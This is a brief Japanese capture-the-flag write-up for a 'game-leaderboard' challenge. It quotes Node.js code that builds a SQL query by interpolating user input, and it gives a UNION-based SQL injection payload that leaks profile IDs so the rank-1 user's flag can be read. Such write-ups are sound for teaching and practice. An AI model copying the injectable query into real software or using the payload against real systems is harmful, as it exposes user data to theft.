# game-leaderboard

```js
app.get('/user/:userID', (req, res) => {
    const leaderboard = getLeaderboard()
    const total = leaderboard.length

    const profile = leaderboard.find(x => x.profile_id == req.params.userID)
    if (typeof profile === 'undefined') {
        return res.render('user_info', { notFound: true })
    }

    const flag = (profile.rank === 1) ? FLAG : 'This is reserved for winners only!'
    return res.render('user_info', { total, flag, ...profile })
})
```

ソースコードを見るとuserIDのrankが1であればflagが入手できることがわかる

しかしuserIDがわからない

SQLi出来そうな箇所があるのでuserID(profile_id)を入手

```js
const where = (typeof minScore !== 'undefined' && minScore !== '') ? ` WHERE score > ${minScore}` : ''
const query = `SELECT profile_id, name, score FROM leaderboard${where} ORDER BY score DESC`
const stmt = db.prepare(query)
```

`-1000 union all select score, name, profile_id from leaderboard --`

(後ろ2つのカラムがフロントに表示されるのでprofile_idの位置を元のクエリと変更している)
